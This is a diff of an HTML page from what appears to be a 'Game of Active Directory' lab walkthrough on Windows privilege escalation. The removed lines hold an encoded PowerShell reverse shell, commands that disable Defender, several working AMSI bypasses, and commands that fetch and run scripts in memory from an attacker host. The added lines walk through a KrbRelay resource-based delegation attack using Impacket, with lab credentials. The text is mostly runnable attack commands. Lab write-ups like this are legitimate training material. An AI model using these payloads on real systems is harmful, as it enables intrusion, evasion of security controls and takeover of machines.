-<pre><code>powershell -exec bypass -enc CgAkAGMAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAnADEAOQAyAC4AMQA2ADgALgA1ADYALgAxACcALAA1ADMAKQA7AAoAJABzACAAPQAgACQAYwAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AAoAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAC4AUgBlAGEAZAAoACQAYgAsACAAMAAsACAAJABiAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewAKACAAIAAgACAAJABkACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIALAAwACwAIAAkAGkAKQA7AAoAIAAgACAAIAAkAHMAYgAgAD0AIAAoAGkAZQB4ACAAJABkACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7AAoAIAAgACAAIAAkAHMAYgAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBiACAAKwAgACcAcABzAD4AIAAnACkAOwAKACAAIAAgACAAJABzAC4AVwByAGkAdABlACgAJABzAGIALAAwACwAJABzAGIALgBMAGUAbgBnAHQAaAApADsACgAgACAAIAAgACQAcwAuAEYAbAB1AHMAaAAoACkACgB9ADsACgAkAGMALgBDAGwAbwBzAGUAKAApAAoA</code></pre>
+<p>
+    We can see above that we can add up to <code>10</code> in domain with user <code>jon.snow</code> in hosts 10.4.10.11!
+</p>
 
+    <img src="images/image-318.png" alt="Untitled">
 
-<p>Now we can use this payload in base64 and execute it on our webpage.</p>
+<p>
+    Now let’s add the computer.
+</p>
 
-<p>rlwrap nc -lnvp 53</p>
-<img src="./game-of-active-directory/part-7-privilege-escalation/images/screenshot_3.png" alt="">
+<p>
+    ### Add computer
+</p>
 
+<p>
+    Using <a href="http://addcomputer.py">addcomputer.py</a> by Impacket.
+</p>
 
-<p>As we can see above, I used rlwrap with NetCat.</p>
+    <a href="http://addcomputer.py/"><code>addcomputer.py</a> -computer-name 'krbrelay$' -computer-pass 'ComputerPass' -dc-host winterfell.north.sevenkingdoms.local -domain-netbios NORTH 'north.sevenkingdoms.local/jon.snow:iknownothing'</code>
 
-<p>Once we are inside the target machine, we can start with a basic user enumeration command:</p>
-<p>whoami /all</p>
-<img src="./game-of-active-directory/part-7-privilege-escalation/images/screenshot_4.png" alt="">
+    <img src="images/image-320.png" alt="Untitled">
 
+<p>
+    The message above confirms that we were able to add a new computer called <code>krbrelay$</code>.
+</p>
 
-<p>The command output shows us several valid info, User info, Group info and Privileges Info for this user.</p>
-<p>As an IIS service user we got SeImpersonatePrivilege privilege, this privilege is enabled by default for this service account.</p>
+<p>
+    ### Get the SID of that computer
+</p>
 
-<h2>Privesc</h2>
+<p>
+    Now we need to get the SID of the computer (Let’s execute it inside our shell in the target machine - PowerShell)
+</p>
 
-<p>for this privesc we will focus on 2 types of privescs that got a “NOT FIX” by Microsoft which are PrintSpoofer and KrbRelay.</p>
+    <code>$o = ([ADSI]"LDAP://CN=krbrelay,CN=Computers,DC=north,DC=sevenkingdoms,DC=local").objectSID
+<p>
+    (New-Object System.Security.Principal.SecurityIdentifier($o.value, 0)).Value</code>
+</p>
 
-<h4>Disable RealTime Defender using an Admin Account</h4>
+    <img src="images/image-321.png" alt="Untitled">
 
-<p>Set-MpPreference -DisableRealtimeMonitoring $true</p>
-<p>Set-MpPreference -DisableIOAVProtection $true</p>
-<p>set-MpPreference -DisableAutoExclusions $true</p>
-<h4>Enable RealTime Defender using an Admin Account</h4>
+    <code>S-1-5-21-1696939732-3083896300-4009139380-1122</code>
 
-<p>Set-MpPreference -DisableRealtimeMonitoring $false</p>
-<p>Set-MpPreference -DisableIOAVProtection $false</p>
-<p>set-MpPreference -DisableAutoExclusions $false</p>
+<p>
+    Uploading File in Powershell.
+</p>
 
+    <code>(New-Object System.Net.WebClient).DownloadFile('<a href="http://192.168.56.1:8080/CheckPort.exe','C:%5C%5Ctmp%5C%5CCheckPort.exe">http://10.4.10.1:8080/CheckPort.exe','C:\\tmp\\CheckPort.exe</a>')</code>
 
-<h3>AMSI - Anti-Malware Scan Interface bypass</h3>
+<p>
+    Now let’s check what ports we can use  internally for this attack by checking what ports can communicate out.  For this we can use CheckPort.exe from KrbRelay.
+</p>
 
-<p>At a high level, think of AMSI like a bridge which connects powershell to the antivirus software, every command or script we run inside powershell is fetched by AMSI and sent to installed antivirus software for inspection.</p>
-<p>AMSI works on signature-based detection. This means that for every particular malicious keyword, URL, function or procedure, AMSI has a related signature in its database. So, if an attacker uses that same keyword in his code again, AMSI blocks the execution then and there.</p>
+    <img src="images/image-322.png" alt="Untitled">
 
-<p>There are several ways to bypass this protection and this is what we will be focused in this session.</p>
-<p>You can check several AMSI bypass in this Repo by S3cur3Th1sSh1t.</p>
-<p>There is also the website amsi.fail that generates obfuscated PowerShell snippets that break or disable AMSI for the current process.</p>
-<p>This PDF is a nice resource to have a look on:</p>
-<p>AMSI Bypass windows 11https://github.com/senzee1984/Amsi_Bypass_In_2023</p>
+<p>
+    We can see that System is allowed through port 10 in this target.
+</p>
 
+<p>
+    Ok now let’s launch the KrbRelay.
+</p>
 
+    <code>.\KrbRelay.exe -spn ldap/winterfell.north.sevenkingdoms.local -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 -rbcd S-1-5-21-1696939732-3083896300-4009139380-1122 -port 10</code>
 
-<p>If CMD non Admin right:</p>
-<p>RunWithRegistryNonAdmin.bat</p>
-<pre><code>set COR_ENABLE_PROFILING=1
-set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}
+    <strong><code>-rbcd</code></strong> - Is the current machine SID
 
-REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f
-REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /f
-REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /ve /t REG_SZ /d "%~dp0InvisiShellProfiler.dll" /f
+    <strong><code>-clsid</strong> -</code>CLSID to use for coercing Kerberos auth from local machine account (default=90f18417-f0f1-484e-9d3c-59dceee5dbd8)
 
-powershell
+    <img src="images/image-323.png" alt="Untitled">
 
-set COR_ENABLE_PROFILING=
-set COR_PROFILER=
-REG DELETE "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f</code></pre>
+<p>
+    Now we can finish the RBCD exploitation using impacket.
+</p>
 
+<p>
+    Using <a href="http://getTGT.py">getTGT.py</a> we uses a valid krbrelay’s NTLM hash to request Kerberos tickets, in order to access any service or machine where that user has permissions.
+</p>
 
+    <code>getTGT.py -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdoms.local'/'krbrelay$':'ComputerPass'</code>
 
-<p>If CMD Admin right</p>
-<p>RunWithPathAsAdmin.bat</p>
-<pre><code>set COR_ENABLE_PROFILING=1
-set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}
-set COR_PROFILER_PATH=%~dp0InvisiShellProfiler.dll
+    <img src="images/image-324.png" alt="Untitled">
 
-powershell
+<p>
+    We were able to retrieve the krbrelay$.ccache to our attacking machine.
+    Now that we detain the Ticket Granting Ticket, we can use it to request the Administrator Service Ticket.
+</p>
 
-set COR_ENABLE_PROFILING=
-set COR_PROFILER=
-set COR_PROFILER_PATH=</code></pre>
-
-
-
-<p>Then in PowerShell</p>
-<pre><code>S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ([TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE (('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"(${n`ULl},${t`RuE} )</code></pre>
-
-
-
-
-<p>(New-Object Net.WebClient).DownloadFile('http://10.4.10.1:8080/PowerView.ps1','C:\\tmp\\PowerView.ps1')</p>
-
-<p>Invisi-Shell https://github.com/OmerYa/Invisi-Shell</p>
-
-<p>AMSI Bypass (if you are in Powershell revershe shell using Evil-WinRM remote access to the target)</p>
-<pre><code>$x=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUt'+'ils');$y=$x.GetField('am'+'siCon'+'text',[Reflection.BindingFlags]'NonPublic,Static');$z=$y.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($z,0x41424344)</code></pre>
-
-
-
-<p>Once we have done that we can use the rasta mouse AMSI bypass to disable AMSI at the .net level. If you want to know why you have to do that, you should read this blog </p>
-<p>post from @ShitSecure explaining the difference between powershell and .net AMSI level : https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/</p>
-
-<p>Now lets use Rasta-Mouse  AMSI-Bypass, add it to a .txt file and upload it to the target and execute it.</p>
-<pre><code># Patching amsi.dll AmsiScanBuffer by rasta-mouse
-$Win32 = @"
-
-using System;
-using System.Runtime.InteropServices;
-
-public class Win32 {
-
-    [DllImport("kernel32")]
-    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-
-    [DllImport("kernel32")]
-    public static extern IntPtr LoadLibrary(string name);
-
-    [DllImport("kernel32")]
-    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-
-}
-"@
-
-Add-Type $Win32
-
-$LoadLibrary = [Win32]::LoadLibrary("amsi.dll")
-$Address = [Win32]::GetProcAddress($LoadLibrary, "AmsiScanBuffer")
-$p = 0
-[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
-$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
-[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)</code></pre>
-
-
-
-
-
-
-<p>EXECUTION:</p>
-<p>AMSI Bypass</p>
-<p>$x=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUt'+'ils');$y=$x.GetField('am'+'siCon'+'text'[Reflection.BindingFlags]'NonPublic,Static');$z=$y.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($z,0x41424344)</p>
-<p>Disable AMSI at the .net level</p>
-<p>(new-object system.net.webclient).downloadstring('http://10.4.10.1:8080/amsi.txt')|IEX</p>
-<img src="./game-of-active-directory/part-7-privilege-escalation/images/screenshot_5.png" alt="">
-
-
-<p>Once we have done that, we can play what we want with the condition to don’t touch the disk!</p>
-<p>We can now play all our .net application by running them directly with execute assembly.</p>
-
-
-<h3>WinPeas without touching disk</h3>
-
-<p>Let’s use WinPEAS script to enumerate the machine and try to escalate our privilege. We can avoid AV detection now by hosting our LinPEAS on our attacking machine and load it in memory and play winPeas from memory with the following powershell commands (As winPeas is in .net we load the assembly and run it directly)</p>
-
-<p>If you don’t want to be bored to compile .net app or modify them with public class and method and no exit.environment you can also use PowerSharpPack and get everything done for you (thanks again to @ShitSecure).</p>
-<pre><code>iex(new-object net.webclient).downloadstring('http://10.4.10.1:8080/PowerSharpPack.ps1')
-PowerSharpPack -winPEAS</code></pre>
-
-
-<p>After executing it we just have to wait for it and see the magic happening.</p>
-
-<p>Analyzing winPEAS output, we can see that we do have some SetImpersonatePrivilege on the current user, so we can use it for privesc.</p>
-<img src="./game-of-active-directory/part-7-privilege-escalation/images/screenshot_6.png" alt="">
-
-
-
-<h3>SeImpersonatePrivilege to Authority\system</h3>
-
-<p>To escalate privileges from our low level user taking advantage of the SetImpersonatePrivilege, we can use one of the POTATOES techniques.</p>
-
-<p>You can learn more about Potatoes Windows Privilege Escalation here: https://jlajara.gitlab.io/Potatoes_Windows_Privesc</p>
-
-<p>For this one we will use SweetPotato which is a compilation of all potatoes.</p>
-
-<div style="margin-top: 40px; padding-top: 20px; border-top: 1px solid var(--jet); display: flex; justify-content: space-between;">
-  <a href="part-6-mssql.html" style="color: var(--orange-yellow-crayola); text-decoration: none;">← Previous: Part 6</a>
-  <a href="part-8-lateral-move.html" style="color: var(--orange-yellow-crayola); text-decoration: none;">Next: Part 8 →</a>
-</div>
-
-        </section>
-
-      </article>
-
+<p>
+- 
+</p>
+<div class="part-navigation">
+      <a href="part-6-mssql.html"><ion-icon name="arrow-back-outline"></ion-icon> Previous: MSSQL</a>
+      <a href="part-8-lateral-move.html">Next: Lateral Move <ion-icon name="arrow-forward-outline"></ion-icon></a>
     </div>
-
+        </section>
+      </article>
+    </div>
   </main>
-
   <script src="../assets/js/script.js"></script>
   <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
   <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
-
 </body>
-
 </html>
